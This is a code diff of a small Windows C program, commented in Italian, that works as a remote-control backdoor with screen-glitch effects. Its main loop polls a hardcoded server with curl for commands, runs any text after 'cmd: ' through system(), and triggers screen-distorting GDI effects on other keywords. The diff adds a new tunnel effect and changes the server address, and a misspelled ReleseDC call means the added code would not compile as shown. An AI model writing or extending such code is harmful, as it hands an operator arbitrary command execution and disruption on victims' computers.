@@ -1,6 +1,5 @@
 #include <windows.h>
 #include <math.h>
-#include <unistd.h>
 #include <string.h>
 #include <stdio.h>
 
@@ -70,7 +69,7 @@ void circleshake_run() {
     h = GetSystemMetrics(SM_CYSCREEN);
 
     HDC hdc = GetDC(NULL);
-    static float angle = 0.0f;
+    static float angle = 0.1f;
 
     int dx = (int)(sin(angle) * 100);
     int dy = (int)(cos(angle) * 100);
@@ -81,6 +80,24 @@ void circleshake_run() {
     angle = angle + 0.1f;
 }
 
+void ltunnel_run() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hdc = GetDC(NULL);
+    
+    int newW = w - (5 * w / 100);
+    int newH = h - (5 * h / 100);
+
+    // centro
+    int x = (w - newW) / 2;
+    int y = (h - newH) / 2;
+
+    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
+    ReleseDC(NULL, hdc);
+    Sleep(100);
+}
+
 void startfx() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
@@ -89,20 +106,21 @@ void startfx() {
     widthglitch_run();
     tunnel_run();
     circleshake_run();
+    ltunnel_run();
 }
 
 int main() {
     while(1) {
         printf("Clean\n");
         char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
-        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. 
+        FILE *pointertotextstream = popen("curl -s http://192.168.122.1:80/rce", "r"); // apre curl in modalita' sola lettura. 
 
         if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
         
         if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
             pclose(pointertotextstream);
             printf("Sleeping for 20secs\n");
-            sleep(20);
+            Sleep(20000);
             continue; //quitta da questo if (quindi se continua ad essere NULL riparte e ritorna qui)
         } 
 
@@ -140,15 +158,21 @@ int main() {
                 circleshake_run();
             }
         }
+        else if (strstr(reqtextbuffer, "LTunnelRun")) {
+            int i;
+            for (i=0;i<100;i++) {
+                ltunnel_run();
+            }
+        }
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
             char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
             command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
             system(command); // esegui (RCE-Style)
             printf("Command Executed\n");
             printf("Sleeping for 20 secs");
-            sleep(20);
+            Sleep(20000);
         }
-        else {sleep(20);}
+        else {Sleep(20000);}
     }
     return 0;
 }
